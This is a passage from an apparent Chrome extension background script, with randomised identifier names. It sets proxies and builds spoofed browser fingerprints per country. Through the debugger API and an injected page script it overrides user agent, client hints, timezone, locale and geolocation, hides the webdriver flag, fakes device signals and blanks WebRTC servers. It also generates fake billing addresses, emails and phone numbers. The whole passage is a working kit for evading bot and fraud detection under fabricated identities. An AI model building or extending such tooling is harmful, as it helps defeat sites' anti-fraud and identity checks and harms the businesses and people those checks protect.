  SE: ['sv-SE', 'sv'],
  NO: ['nb-NO', 'nb', 'nn-NO', 'nn'],
  DK: ['da-DK', 'da'],
  FI: ['fi-FI', 'fi'],
  GR: ['el-GR', 'el'],
  CZ: ['cs-CZ', 'cs'],
  HU: ['hu-HU', 'hu'],
  RO: ['ro-RO', 'ro'],
  BG: ['bg-BG', 'bg'],
  HR: ['hr-HR', 'hr'],
  RS: ['sr-RS', 'sr'],
  SK: ['sk-SK', 'sk'],
  LT: ['lt-LT', 'lt'],
  LV: ['lv-LV', 'lv'],
  EE: ['et-EE', 'et'],
  SI: ['sl-SI', 'sl'],
  AL: ['sq-AL', 'sq'],
  BA: ['bs-BA', 'bs'],
  IS: ['is-IS', 'is'],
  EG: ['ar-EG', 'ar'],
  SA: ['ar-SA', 'ar'],
  AE: ['ar-AE', 'ar', 'en-AE'],
  IL: ['he-IL', 'he', 'ar-IL'],
  IR: ['fa-IR', 'fa'],
  IQ: ['ar-IQ', 'ar'],
  DZ: ['ar-DZ', 'ar', 'fr-DZ'],
  MA: ['ar-MA', 'ar', 'fr-MA'],
  TN: ['ar-TN', 'ar', 'fr-TN'],
  SN: ['fr-SN', 'fr', 'wo-SN'],
  CI: ['fr-CI', 'fr'],
  CM: ['fr-CM', 'fr', 'en-CM'],
  AO: ['pt-AO', 'pt'],
  KZ: ['kk-KZ', 'kk', 'ru-KZ'],
  UZ: ['uz-UZ', 'uz', 'ru-UZ'],
  BY: ['be-BY', 'be', 'ru-BY'],
  AD: ['ca-AD', 'ca'],
  AM: ['hy-AM', 'hy', 'ru-AM'],
  AW: ['nl-AW', 'nl'],
  AX: ['sv-AX', 'sv', 'fi-AX'],
  AZ: ['az-AZ', 'az', 'ru-AZ'],
  BE: ['nl-BE', 'nl', 'fr-BE'],
  BF: ['fr-BF', 'fr'],
  BH: ['ar-BH', 'ar'],
  BI: ['rn-BI', 'rn', 'fr-BI'],
  BJ: ['fr-BJ', 'fr'],
  BL: ['fr-BL', 'fr'],
  BN: ['ms-BN', 'ms'],
  BQ: ['nl-BQ', 'nl'],
  BT: ['dz-BT', 'dz'],
  CD: ['fr-CD', 'fr', 'ln-CD'],
  CF: ['fr-CF', 'fr'],
  CG: ['fr-CG', 'fr'],
  CH: ['de-CH', 'de', 'fr-CH', 'it-CH'],
  CV: ['pt-CV', 'pt'],
  CW: ['nl-CW', 'nl'],
  CY: ['el-CY', 'el'],
  DJ: ['fr-DJ', 'fr', 'ar-DJ'],
  EA: ['es-EA', 'es'],
  EH: ['ar-EH', 'ar'],
  ER: ['ti-ER', 'ti', 'ar-ER'],
  ET: ['am-ET', 'am'],
  FO: ['fo-FO', 'fo', 'da-FO'],
  GA: ['fr-GA', 'fr'],
  GE: ['ka-GE', 'ka'],
  GF: ['fr-GF', 'fr'],
  GL: ['kl-GL', 'kl', 'da-GL'],
  GN: ['fr-GN', 'fr'],
  GP: ['fr-GP', 'fr'],
  GQ: ['es-GQ', 'es', 'fr-GQ'],
  GW: ['pt-GW', 'pt'],
  HK: ['zh-HK', 'zh', 'en-HK'],
  HT: ['ht-HT', 'ht', 'fr-HT'],
  IC: ['es-IC', 'es'],
  JO: ['ar-JO', 'ar'],
  KG: ['ky-KG', 'ky', 'ru-KG'],
  KM: ['ar-KM', 'ar', 'fr-KM'],
  KP: ['ko-KP', 'ko'],
  KW: ['ar-KW', 'ar'],
  LB: ['ar-LB', 'ar', 'fr-LB'],
  LI: ['de-LI', 'de'],
  LS: ['st-LS', 'st'],
  LU: ['fr-LU', 'fr', 'de-LU'],
  LY: ['ar-LY', 'ar'],
  MC: ['fr-MC', 'fr'],
  MD: ['ro-MD', 'ro', 'ru-MD'],
  ME: ['sr-ME', 'sr'],
  MF: ['fr-MF', 'fr'],
  MG: ['mg-MG', 'mg', 'fr-MG'],
  MK: ['mk-MK', 'mk', 'sq-MK'],
  ML: ['fr-ML', 'fr'],
  MO: ['zh-MO', 'zh', 'pt-MO'],
  MQ: ['fr-MQ', 'fr'],
  MR: ['ar-MR', 'ar', 'fr-MR'],
  MT: ['mt-MT', 'mt', 'en-MT'],
  MV: ['dv-MV', 'dv'],
  MZ: ['pt-MZ', 'pt'],
  NC: ['fr-NC', 'fr'],
  NE: ['fr-NE', 'fr', 'ha-NE'],
  NI: ['es-NI', 'es'],
  OM: ['ar-OM', 'ar'],
  PF: ['fr-PF', 'fr'],
  PM: ['fr-PM', 'fr'],
  PR: ['es-PR', 'es'],
  PS: ['ar-PS', 'ar'],
  QA: ['ar-QA', 'ar'],
  RE: ['fr-RE', 'fr'],
  RW: ['rw-RW', 'rw', 'fr-RW'],
  SD: ['ar-SD', 'ar'],
  SM: ['it-SM', 'it'],
  SO: ['so-SO', 'so', 'ar-SO'],
  SR: ['nl-SR', 'nl'],
  ST: ['pt-ST', 'pt'],
  SV: ['es-SV', 'es'],
  SX: ['nl-SX', 'nl'],
  SY: ['ar-SY', 'ar'],
  TD: ['fr-TD', 'fr', 'ar-TD'],
  TF: ['fr-TF', 'fr'],
  TG: ['fr-TG', 'fr'],
  TJ: ['tg-TJ', 'tg', 'ru-TJ'],
  TL: ['pt-TL', 'pt', 'tet-TL'],
  TM: ['tk-TM', 'tk', 'ru-TM'],
  TO: ['to-TO', 'to'],
  TZ: ['sw-TZ', 'sw', 'en-TZ'],
  VA: ['it-VA', 'it'],
  VU: ['bi-VU', 'bi', 'en-VU'],
  WF: ['fr-WF', 'fr'],
  WS: ['sm-WS', 'sm'],
  XK: ['sq-XK', 'sq', 'sr-XK'],
  YE: ['ar-YE', 'ar'],
  YT: ['fr-YT', 'fr'],
  ZA: ['en-ZA', 'en', 'af-ZA'],
  ZM: ['en-ZM', 'en', 'bem-ZM'],
  ZW: ['en-ZW', 'en', 'sn-ZW']
};
function funcHavingMotion(argLocalSweet) {
  return argLocalSweet.map((argAlongMighty, argEarthUnhappy) => {
    if (argEarthUnhappy === 0) {
      return argAlongMighty;
    }
    const varHabitPile = Math.max(0.1, 1 - argEarthUnhappy * 0.1);
    return argAlongMighty + ';q=' + varHabitPile.toFixed(1);
  }).join(',');
}
function funcInfluencePerfectly(argGamePole, argLyingSets) {
  let varBeyondMile = varHeartScared[argLyingSets] ? [...varHeartScared[argLyingSets]] : [...(argGamePole.languages || [])];
  if (!varBlowMouth.has(argLyingSets)) {
    varBeyondMile = varBeyondMile.filter(argLegStructure => argLegStructure !== 'en-US' && argLegStructure !== 'en');
  }
  varBeyondMile = [...new Set(varBeyondMile.filter(Boolean))];
  if (!varBeyondMile.length) {
    varBeyondMile = [...(argGamePole.languages || ['en-US'])];
  }
  return {
    languages: varBeyondMile,
    language: varBeyondMile[0],
    acceptLang: funcHavingMotion(varBeyondMile),
    locale: argGamePole.locale
  };
}
function funcLackWrote(argGrassPolitical) {
  if (!argGrassPolitical || typeof argGrassPolitical !== 'string') {
    return '';
  }
  const varFedUnderline = argGrassPolitical.split('/').pop();
  if (varFedUnderline) {
    return varFedUnderline.replace(/_/g, ' ');
  } else {
    return '';
  }
}
function funcCopyStore(argContainUpon, argJobOff, argLovelyOffice) {
  const varGardenSeries = argLovelyOffice || varClassroomSwung[argJobOff] || {};
  // Extract city from timezone string (e.g. "Europe/London" -> "London")
  const varDugPen = varGardenSeries.timezone ? varGardenSeries.timezone.split('/').pop().replace(/_/g, ' ') : null;
  if (varDugPen && (!argContainUpon.city || argContainUpon.city === varGardenSeries.name || argContainUpon.city === argJobOff)) {
    argContainUpon.city = varDugPen;
  }
  argContainUpon.flag = varGardenSeries.flag || argContainUpon.flag || '';
  argContainUpon.countryName = varGardenSeries.name || argContainUpon.countryName || argJobOff;
  argContainUpon._region = argContainUpon.state || argContainUpon.city || '';
  return argContainUpon;
}
function funcFactSelection(argGetYour, argAwayNearest) {
  const varLiveStation = (argGetYour || 'US').toUpperCase();
  const varLargeNew = varClassroomSwung[varLiveStation] || varClassroomSwung.US;
  const varForthTobacco = argAwayNearest != null ? argAwayNearest : Math.floor(Math.random() * 99999);
  // Use addresslib's buildBillingAddress (exposed as self.buildBillingAddress via importScripts)
  const buildFn = (typeof self !== 'undefined' && self.buildBillingAddress) ? self.buildBillingAddress : null;
  const varAidWing = buildFn ? buildFn(varLiveStation, varForthTobacco, varLargeNew) : {
    name: 'User', address: '123 Main St', city: varLargeNew.name || varLiveStation,
    state: varLargeNew.name || varLiveStation, zip: '10001', country: varLiveStation,
    countryName: varLargeNew.name || varLiveStation, flag: varLargeNew.flag || '',
    email: 'user@gmail.com', phone: '+1 555 0100'
  };
  return funcCopyStore(varAidWing, varLiveStation, varLargeNew);
}
async function funcCrowdWheat() {
  const varInvolvedStill = await new Promise(argBrickStronger => chrome.storage.local.get(['fingerprint', 'kimtim_proxy_info'], argBrickStronger));
  const varFrameWooden = varInvolvedStill.fingerprint;
  if (varFrameWooden && varFrameWooden.active && varFrameWooden.countryCode) {
    return varFrameWooden.countryCode.toUpperCase();
  }
  let varBusMean = varInvolvedStill.kimtim_proxy_info;
  if (typeof varBusMean === 'string') {
    try {
      varBusMean = JSON.parse(varBusMean);
    } catch (varHerselfTouch) {
      varBusMean = null;
    }
  }
  if (varBusMean && varBusMean.country_code) {
    return String(varBusMean.country_code).toUpperCase();
  }
  const varBlackPost = await funcCapitalVictory();
  if (varBlackPost && varBlackPost.ok && varBlackPost.code) {
    return varBlackPost.code.toUpperCase();
  }
  return 'MO';
}
function funcEngineerSolar(argEverythingMan, argExplanationTravel, argDistanceMusic) {
  argDistanceMusic = argDistanceMusic || 'windows';
  const varAtomSince = varClassroomSwung[argEverythingMan] || varClassroomSwung.US;
  const varAroundMay = funcInfluencePerfectly(varAtomSince, argEverythingMan);
  const varBecameNeighbor = funcLionPowerful(argDistanceMusic, argExplanationTravel);
  const varExcitedQuarter = funcFightingWhich(argDistanceMusic, argExplanationTravel);
  const varArriveWindow = (argExplanationTravel * 13 % 200 - 100) / 50000;
  const varControlTheory = (argExplanationTravel * 17 % 200 - 100) / 50000;
  const varAgainstWell = !!varBecameNeighbor.mobile;
  const varMadStone = funcFactSelection(argEverythingMan, argExplanationTravel);
  return {
    active: true,
    countryCode: argEverythingMan,
    countryName: varAtomSince.name,
    seed: argExplanationTravel,
    os: argDistanceMusic,
    billing: varMadStone,
    userAgent: varBecameNeighbor.ua,
    platform: varBecameNeighbor.platform,
    platformStr: varBecameNeighbor.platformStr,
    platformVersion: varBecameNeighbor.platformVersion,
    brands: varBecameNeighbor.brands,
    fullVer: varBecameNeighbor.fullVer,
    arch: varBecameNeighbor.arch,
    bitness: varBecameNeighbor.bitness,
    mobile: varAgainstWell,
    model: varBecameNeighbor.model || '',
    language: varAroundMay.language,
    languages: varAroundMay.languages,
    acceptLang: varAroundMay.acceptLang,
    timezone: funcAirplaneRose(argEverythingMan, varAtomSince.timezone, argExplanationTravel),
    locale: varAroundMay.locale,
    lat: +(varAtomSince.lat + varArriveWindow).toFixed(6),
    lon: +(varAtomSince.lon + varControlTheory).toFixed(6),
    accuracy: 15 + argExplanationTravel % 25,
    screenW: varExcitedQuarter.w,
    screenH: varExcitedQuarter.h,
    dpr: varExcitedQuarter.dpr,
    preserveLayout: true,
    hwConcurrency: varAgainstWell ? 6 : 8,
    deviceMemory: varAgainstWell ? 4 : 8
  };
}
function funcChartSpent(argEnginePoetry) {
  const varBranchSlept = !!argEnginePoetry.mobile;
  const varHideSaid = JSON.stringify(argEnginePoetry.languages || [argEnginePoetry.language || 'en-US']);
  const varBaseTonight = JSON.stringify(argEnginePoetry.language || 'en-US');
  const varFinishNuts = JSON.stringify(argEnginePoetry.timezone || 'UTC');
  const varFellProduct = JSON.stringify(argEnginePoetry.platform || 'Win32');
  const varBurstStill = JSON.stringify(argEnginePoetry.userAgent || '');
  const varLearnTriangle = JSON.stringify(argEnginePoetry.acceptLang || 'en-US,en;q=0.9');
  const varHerdYouth = argEnginePoetry.hwConcurrency || (varBranchSlept ? 6 : 8);
  const varFairPipe = argEnginePoetry.deviceMemory || (varBranchSlept ? 4 : 8);
  const varGuideTo = varBranchSlept ? 'cellular' : 'wifi';
  const varCupName = varBranchSlept ? 5 : 0;
  return '(function(){\n    try {\n      const _nbTz=' + varFinishNuts + ';\n      const _nbLangs=' + varHideSaid + ';\n      const _nbAccept=' + varLearnTriangle + ';\n      Object.defineProperty(navigator,\'language\',{get:()=>' + varBaseTonight + ',configurable:true});\n      Object.defineProperty(navigator,\'languages\',{get:()=>_nbLangs.slice(),configurable:true});\n      Object.defineProperty(navigator,\'userAgent\',{get:()=>' + varBurstStill + ',configurable:true});\n      Object.defineProperty(navigator,\'platform\',{get:()=>' + varFellProduct + ',configurable:true});\n      Object.defineProperty(navigator,\'webdriver\',{get:()=>false,configurable:true});\n      Object.defineProperty(navigator,\'maxTouchPoints\',{get:()=>' + varCupName + ',configurable:true});\n      Object.defineProperty(navigator,\'hardwareConcurrency\',{get:()=>' + varHerdYouth + ',configurable:true});\n      Object.defineProperty(navigator,\'deviceMemory\',{get:()=>' + varFairPipe + ',configurable:true});\n      try{delete navigator.webdriver;}catch(e){}\n      window.__nbFp={acceptLang:_nbAccept,timezone:_nbTz,locale:' + JSON.stringify(argEnginePoetry.locale || '') + ',country:' + JSON.stringify(argEnginePoetry.countryCode || '') + ',language:' + varBaseTonight + ',billing:' + JSON.stringify(argEnginePoetry.billing || null) + '};\n      if(navigator.getBattery){\n        navigator.getBattery=()=>Promise.resolve({charging:true,chargingTime:0,dischargingTime:Infinity,level:' + (varBranchSlept ? '0.87' : '1.0') + ',addEventListener:()=>{},removeEventListener:()=>{}});\n      }\n      if(\'connection\' in navigator){\n        Object.defineProperty(navigator,\'connection\',{get:()=>({type:\'' + varGuideTo + '\',effectiveType:\'4g\',downlink:10,downlinkMax:Infinity,rtt:50,saveData:false,addEventListener:()=>{},removeEventListener:()=>{}}),configurable:true});\n      }\n      navigator.vibrate=()=>false;\n      const _OrigDTF=Intl.DateTimeFormat;\n      const _WrappedDTF=function(locales,opts){\n        opts=Object.assign({},opts||{});\n        if(!opts.timeZone)opts.timeZone=_nbTz;\n        return new _OrigDTF(locales,opts);\n      };\n      _WrappedDTF.prototype=_OrigDTF.prototype;\n      _WrappedDTF.supportedLocalesOf=_OrigDTF.supportedLocalesOf.bind(_OrigDTF);\n      Intl.DateTimeFormat=_WrappedDTF;\n      const _OrigResolve=Intl.DateTimeFormat.prototype.resolvedOptions;\n      Intl.DateTimeFormat.prototype.resolvedOptions=function(){\n        const o=_OrigResolve.call(this);\n        if(o)o.timeZone=_nbTz;\n        return o;\n      };\n      const _RTC=window.RTCPeerConnection||window.webkitRTCPeerConnection;\n      if(_RTC){\n        const _OrigRTC=_RTC;\n        window.RTCPeerConnection=function(cfg,...args){\n          if(cfg&&cfg.iceServers)cfg.iceServers=[];\n          return new _OrigRTC(cfg,...args);\n        };\n        window.RTCPeerConnection.prototype=_OrigRTC.prototype;\n      }\n    }catch(e){}\n  })();';
}
chrome.runtime.onInstalled.addListener((details) => {
  chrome.storage.local.get(['proxies'], argInterestShelf => {
    if (!argInterestShelf.proxies) {
      chrome.storage.local.set({
        proxies: [],
        activeProxy: null,
        fingerprint: null
      });
    }
  });
  funcGrewPerfect();

  // Auto-open login dashboard on install/update/reload
  if (details && (details.reason === 'install' || details.reason === 'update')) {
    chrome.tabs.create({ url: chrome.runtime.getURL('popup/popup.html?full=1') });
  }
});

// Also open on browser startup if user isn't logged in yet
chrome.runtime.onStartup && chrome.runtime.onStartup.addListener(() => {
  chrome.storage.local.get(['tg_token'], (r) => {
    if (!r.tg_token) {
      chrome.tabs.create({ url: chrome.runtime.getURL('popup/popup.html?full=1') });
    }
  });
});
chrome.runtime.onMessage.addListener((argArtSafety, argFeetToday, argCattleMud) => {
  if (argArtSafety.action === 'setProxy') {
    funcBlueSimple(argArtSafety.proxy);
    argCattleMud({
      ok: true
    });
  } else {
    if (argArtSafety.action === 'clearProxy') {
      funcBearTook();
      argCattleMud({
        ok: true
      });
    } else {
      if (argArtSafety.action === 'checkProxy') {
        funcBurnTube(argArtSafety.proxy)
          .then(argFellowNose => argCattleMud(argFellowNose))
          .catch(err => argCattleMud({ success: false, error: (err && err.message) || 'checkProxy failed' }));
        return true;
      } else {
        if (argArtSafety.action === 'getFingerprint') {
          chrome.storage.local.get(['fingerprint'], argLampName => {
            void chrome.runtime.lastError;
            argCattleMud((argLampName && argLampName.fingerprint) || null);
          });
          return true;
        } else {
          if (argArtSafety.action === 'checkSpoof') {
            argCattleMud({
              ok: true,
              allowed: true,
              spoof_today: 0
            });
          } else {
            if (argArtSafety.action === 'buildFP') {
              argCattleMud(funcEngineerSolar(argArtSafety.countryCode, argArtSafety.seed || Math.floor(Math.random() * 9999), argArtSafety.os));
            } else {
              if (argArtSafety.action === 'setFingerprint') {
                funcFogPlant(argArtSafety.fingerprint);
                argCattleMud({
                  ok: true
                });
              } else {
                if (argArtSafety.action === 'clearFingerprint') {
                  funcBoxSomeone();
                  argCattleMud({
                    ok: true
                  });
                } else {
                  if (argArtSafety.action === 'detectCountry') {
                    funcCapitalVictory()
                      .then(argLeftNative => argCattleMud(argLeftNative))
                      .catch(err => argCattleMud({ ok: false, error: (err && err.message) || 'detectCountry failed' }));
                    return true;
                  } else {
                    if (argArtSafety.action === 'getBillingAddress') {
                      (async () => {
                        const varBeautifulOne = argArtSafety.countryCode ? String(argArtSafety.countryCode).toUpperCase() : await funcCrowdWheat();
                        const varConstructionRemember = funcFactSelection(varBeautifulOne, argArtSafety.seed != null ? argArtSafety.seed : Math.floor(Math.random() * 99999));
                        argCattleMud({
                          ok: true,
                          source: argArtSafety.countryCode ? 'manual' : 'auto',
                          code: varBeautifulOne,
                          ...varConstructionRemember
                        });
                      })().catch(err => argCattleMud({ ok: false, error: (err && err.message) || 'getBillingAddress failed' }));
                      return true;
                    } else {
                      if (argArtSafety.action === 'listCountries') {
                        argCattleMud(Object.entries(varClassroomSwung).map(([argBiteQuestion, argAudienceWould]) => ({
                          code: argBiteQuestion,
                          name: argAudienceWould.name,
                          flag: argAudienceWould.flag || ''
                        })));
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  // All async branches above have their own `return true` before this point.
  // Returning true here for every message (including ones this listener never
  // handled) wedged the message port open until Chrome reaped it, producing
  // "message port closed before a response was received" warnings.
  return false;
});
function funcBlueSimple(argLikeShape) {
  if (!argLikeShape) {
    funcBearTook();
    return;
  }
  const varExcitedUnderstanding = argLikeShape.type === 'socks5' ? 'socks5' : argLikeShape.type === 'socks4' ? 'socks4' : 'http';
  chrome.proxy.settings.set({
    value: {
      mode: 'fixed_servers',
      rules: {
        singleProxy: {
          scheme: varExcitedUnderstanding,
          host: argLikeShape.host,
          port: parseInt(argLikeShape.port)
        },
        // Add the proxy's own host to the bypass list so that:
        // 1. funcBurnTube's liveness check reaches the proxy server DIRECTLY
        //    (not routed through itself, which creates a proxy loop → "Dead").
        // 2. Requests to the proxy host never recurse through the proxy.
        bypassList: ['localhost', '127.0.0.1', '::1', argLikeShape.host]
      }
    },
    scope: 'regular'
  }, () => {
    void chrome.runtime.lastError;
    chrome.storage.local.set({ activeProxy: argLikeShape }, () => { void chrome.runtime.lastError; });
    funcBearSummer('ON', '#22c55e');
  });
}
function funcBearTook() {
  chrome.proxy.settings.set({
    value: {
      mode: 'direct'
    },
    scope: 'regular'
  }, () => {
    void chrome.runtime.lastError;
    chrome.storage.local.set({ activeProxy: null }, () => { void chrome.runtime.lastError; });
    funcGrewPerfect();
  });
}
chrome.webRequest.onAuthRequired.addListener((argCopyPilot, argDrawSolve) => {
  chrome.storage.local.get(['activeProxy'], argLooseSeveral => {
    const varLowMaking = argLooseSeveral.activeProxy;
    argDrawSolve(varLowMaking && varLowMaking.user ? {
      authCredentials: {
        username: varLowMaking.user,
        password: varLowMaking.pass || ''
      }
    } : {});
  });
}, {
  urls: ['<all_urls>']
}, ['asyncBlocking']);
const varFeltPolitical = new Set();
function funcForgottenSimple(argCompletePotatoes, argAliveShorter, argDuringMathematics = {}) {
  return new Promise(argLotWire => {
    chrome.debugger.sendCommand({
      tabId: argCompletePotatoes
    }, argAliveShorter, argDuringMathematics, argCattlePost => {
      chrome.runtime.lastError;
      argLotWire(argCattlePost || null);
    });
  });
}
async function funcInPrincipal(argHoldTaste) {
  if (varFeltPolitical.has(argHoldTaste)) {
    return true;
  }
  return new Promise(argDroveNeighborhood => {
    chrome.debugger.attach({
      tabId: argHoldTaste
    }, '1.3', () => {
      if (chrome.runtime.lastError) {
        argDroveNeighborhood(false);
        return;
      }
      varFeltPolitical.add(argHoldTaste);
      argDroveNeighborhood(true);
    });
  });
}
async function funcLoseSoldier(argMagnetMarried, argDotValley) {
  if (!argDotValley || !argDotValley.active) {
    return;
  }
  const varCardWild = await funcInPrincipal(argMagnetMarried);
  if (!varCardWild) {
    return;
  }
  await funcForgottenSimple(argMagnetMarried, 'Emulation.setTimezoneOverride', {
    timezoneId: argDotValley.timezone
  });
  await funcForgottenSimple(argMagnetMarried, 'Emulation.setLocaleOverride', {
    locale: argDotValley.locale
  });
  const varGroupPerson = {
    brands: argDotValley.brands || [],
    fullVersionList: (argDotValley.brands || []).map(argImpossibleSpend => ({
      brand: argImpossibleSpend.brand,
      version: argDotValley.fullVer || argImpossibleSpend.version + '.0.0.0'
    })),
    platform: argDotValley.platformStr,
    platformVersion: argDotValley.platformVersion,
    architecture: argDotValley.arch,
    model: argDotValley.model || '',
    mobile: !!argDotValley.mobile,
    bitness: argDotValley.bitness,
    wow64: false
  };
  await funcForgottenSimple(argMagnetMarried, 'Emulation.setUserAgentOverride', {
    userAgent: argDotValley.userAgent,
    acceptLanguage: argDotValley.acceptLang,
    platform: argDotValley.platform,
    userAgentMetadata: varGroupPerson
  });
  await funcForgottenSimple(argMagnetMarried, 'Emulation.setGeolocationOverride', {
    latitude: argDotValley.lat,
    longitude: argDotValley.lon,
    accuracy: argDotValley.accuracy
  });
  const varAccountValley = !!argDotValley.mobile;
  await funcForgottenSimple(argMagnetMarried, 'Emulation.setTouchEmulationEnabled', {
    enabled: varAccountValley,
    maxTouchPoints: varAccountValley ? 5 : 0
  });
  await funcForgottenSimple(argMagnetMarried, 'Emulation.clearDeviceMetricsOverride');
  await funcForgottenSimple(argMagnetMarried, 'Network.enable');
  await funcForgottenSimple(argMagnetMarried, 'Network.setExtraHTTPHeaders', {
    headers: {
      'Accept-Language': argDotValley.acceptLang,
      'User-Agent': argDotValley.userAgent
    }
  });
  await funcForgottenSimple(argMagnetMarried, 'Page.enable');
  await funcForgottenSimple(argMagnetMarried, 'Page.addScriptToEvaluateOnNewDocument', {
    source: funcChartSpent(argDotValley)
  });
}
async function funcAnotherThrew(argEngineerWolf) {
  if (!varFeltPolitical.has(argEngineerWolf)) {
    return;
  }
  return new Promise(argGaveSingle => {
    chrome.debugger.detach({
      tabId: argEngineerWolf
    }, () => {
      varFeltPolitical.delete(argEngineerWolf);
      chrome.runtime.lastError;
      argGaveSingle();
    });
  });
}
chrome.tabs.onUpdated.addListener(async (argFullSpecies, argFunOut) => {
  if (argFunOut.status !== 'loading') {
    return;
  }
  const {
    fingerprint: varAirplaneRice
  } = await new Promise(argConstructionSeeing => chrome.storage.local.get(['fingerprint'], argConstructionSeeing));
  if (varAirplaneRice && varAirplaneRice.active) {
    funcLoseSoldier(argFullSpecies, varAirplaneRice);
  }
});
chrome.tabs.onRemoved.addListener(argCoffeeRising => varFeltPolitical.delete(argCoffeeRising));
chrome.debugger.onDetach.addListener(argCalmProblem => {
  if (argCalmProblem.tabId) {
    varFeltPolitical.delete(argCalmProblem.tabId);
  }
});
function funcFogPlant(argCommunityReader) {
  chrome.storage.local.set({
    fingerprint: argCommunityReader
  });
  funcGrowNews(argCommunityReader);
  chrome.tabs.query({}, argBringParallel => {
    argBringParallel.forEach(argJoyYour => {
      if (argJoyYour.id && argJoyYour.url && !argJoyYour.url.startsWith('chrome://') && !argJoyYour.url.startsWith('about:')) {
        funcLoseSoldier(argJoyYour.id, argCommunityReader);
      }
    });
  });
}
async function funcBoxSomeone() {
  chrome.storage.local.set({
    fingerprint: {
      active: false
    }
  });
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1]
  });
  const varEatSpeech = await chrome.tabs.query({});
  for (const varGravityRing of varEatSpeech) {
    if (!varGravityRing.id) {
      continue;
    }
    if (varFeltPolitical.has(varGravityRing.id)) {
      await funcForgottenSimple(varGravityRing.id, 'Emulation.clearDeviceMetricsOverride');
      await funcForgottenSimple(varGravityRing.id, 'Emulation.setTouchEmulationEnabled', {
        enabled: false,
        maxTouchPoints: 0
      });
    }
    await funcAnotherThrew(varGravityRing.id);
  }
}
function funcGrowNews(argDanceNational) {
  const varAreaTired = [{
    header: 'Accept-Language',
    operation: 'set',
    value: argDanceNational.acceptLang
  }, {
    header: 'User-Agent',
    operation: 'set',
    value: argDanceNational.userAgent
  }];
  if (argDanceNational.brands && argDanceNational.brands.length) {
    const varCarriedTongue = argDanceNational.brands.map(argEmptyRays => '"' + argEmptyRays.brand + '";v="' + argEmptyRays.version + '"').join(', ');
    const varConditionPool = (argDanceNational.brands || []).map(argCentNearby => ({
      brand: argCentNearby.brand,
      version: argDanceNational.fullVer || argCentNearby.version + '.0.0.0'
    })).map(argLocationOrder => '"' + argLocationOrder.brand + '";v="' + argLocationOrder.version + '"').join(', ');
    varAreaTired.push({
      header: 'Sec-CH-UA',
      operation: 'set',
      value: varCarriedTongue
    });
    varAreaTired.push({
      header: 'Sec-CH-UA-Full-Version-List',
      operation: 'set',
      value: varConditionPool
    });
    varAreaTired.push({
      header: 'Sec-CH-UA-Platform',
      operation: 'set',
      value: '"' + argDanceNational.platformStr + '"'
    });
    varAreaTired.push({
      header: 'Sec-CH-UA-Mobile',
      operation: 'set',
      value: argDanceNational.mobile ? '?1' : '?0'
    });
    if (argDanceNational.arch) {
      varAreaTired.push({
        header: 'Sec-CH-UA-Arch',
        operation: 'set',
        value: '"' + argDanceNational.arch + '"'
      });
    }
    if (argDanceNational.bitness) {
      varAreaTired.push({
        header: 'Sec-CH-UA-Bitness',
        operation: 'set',
        value: '"' + argDanceNational.bitness + '"'
      });
    }
    if (argDanceNational.model) {
      varAreaTired.push({
        header: 'Sec-CH-UA-Model',
        operation: 'set',
        value: '"' + argDanceNational.model + '"'
      });
    }
  } else {
    varAreaTired.push({
      header: 'Sec-CH-UA',
      operation: 'remove'
    });
    varAreaTired.push({
      header: 'Sec-CH-UA-Platform',
      operation: 'remove'
    });
    varAreaTired.push({
      header: 'Sec-CH-UA-Mobile',
      operation: 'remove'
    });
  }
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1],
    addRules: [{
      id: 1,
      priority: 1,
      action: {
        type: 'modifyHeaders',
        requestHeaders: varAreaTired
      },
      condition: {
        urlFilter: '*',
        resourceTypes: ['main_frame', 'sub_frame', 'xmlhttprequest', 'other', 'script', 'image', 'stylesheet', 'font', 'media']
      }
    }]
  });
}
async function funcEagerWalk(argBusinessUnit) {
  const varMagicPrinciple = new AbortController();
  const varFriendPrivate = setTimeout(() => varMagicPrinciple.abort(), 7000);
  try {
    const varHurriedTelephone = await fetch(argBusinessUnit.url, {
      cache: 'no-store',
      signal: varMagicPrinciple.signal
    });
    if (!varHurriedTelephone.ok) {
      return null;
    }
    const varDaughterWeight = await argBusinessUnit.parse(varHurriedTelephone);
    if (varDaughterWeight && typeof varDaughterWeight === 'string' && varDaughterWeight.length === 2) {
      return {
        code: varDaughterWeight.toUpperCase(),
        source: argBusinessUnit.source
      };
    }
    return null;
  } catch (varGoesTaught) {
    return null;
  } finally {
    clearTimeout(varFriendPrivate);
  }
}
async function funcCapitalVictory() {
  const varColdManner = [{
    source: 'country.is',
    url: 'https://api.country.is/',
    parse: async argClothingZero => (await argClothingZero.json()).country
  }, {
    source: 'ipwho.is',
    url: 'https://ipwho.is/',
    parse: async argDrySouthern => {
      const varCoverTrip = await argDrySouthern.json();
      if (varCoverTrip.success) {
        return varCoverTrip.country_code;
      } else {
        return null;
      }
    }
  }, {
    source: 'geojs.io',
    url: 'https://get.geojs.io/v1/ip/country.json',
    parse: async argGroupMountain => (await argGroupMountain.json()).country
  }, {
    source: 'cloudflare',
    url: 'https://cloudflare.com/cdn-cgi/trace',
    parse: async argFinestStory => {
      const varDiscussionSo = await argFinestStory.text();
      const varChooseMix = varDiscussionSo.match(/^loc=([A-Z]{2})$/m);
      if (varChooseMix) {
        return varChooseMix[1];
      } else {
        return null;
      }
    }
  }, {
    source: 'ip-api.com',
    url: 'https://ip-api.com/json/?fields=status,countryCode',
    parse: async argLongRose => {
      const varEquipmentMother = await argLongRose.json();
      if (varEquipmentMother.status === 'success') {
        return varEquipmentMother.countryCode;
      } else {
        return null;
      }
    }
  }, {
    source: 'ipapi.co',
    url: 'https://ipapi.co/json/',
    parse: async argCloudSure => {
      const varCanalMass = await argCloudSure.json();
      if (varCanalMass.error) {
        return null;
      } else {
        return varCanalMass.country_code;
      }
    }
  }];
  const varMachineryOpen = await Promise.all(varColdManner.map(funcEagerWalk));
  const varClearlySmooth = {};
  for (const varDrawPitch of varMachineryOpen) {
    if (!varDrawPitch || !varDrawPitch.code) {
      continue;
    }
    if (!varClearlySmooth[varDrawPitch.code]) {
      varClearlySmooth[varDrawPitch.code] = {
        count: 0,
        sources: []
      };
    }
    varClearlySmooth[varDrawPitch.code].count++;
    varClearlySmooth[varDrawPitch.code].sources.push(varDrawPitch.source);
  }
  const varConsistUnless = Object.entries(varClearlySmooth).sort((argArmyOught, argHusbandSecret) => argHusbandSecret[1].count - argArmyOught[1].count);
  if (!varConsistUnless.length) {
    return {
      ok: false,
      code: null,
      name: null,
      error: 'All geo APIs failed \u2014 try again or select manually'
    };
  }
